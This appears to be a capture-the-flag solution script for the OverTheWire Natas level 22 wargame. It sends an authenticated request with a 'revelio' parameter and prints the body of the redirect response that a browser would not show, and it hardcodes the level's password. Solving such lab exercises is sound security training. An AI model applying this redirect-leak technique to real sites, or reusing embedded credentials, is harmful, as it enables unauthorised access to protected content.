import requests
from requests.auth import HTTPBasicAuth

uri = 'http://natas22.natas.labs.overthewire.org/index.php?revelio'

g = requests.get( uri,
    auth=HTTPBasicAuth('natas22', 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'))

print( g.history[0].text )
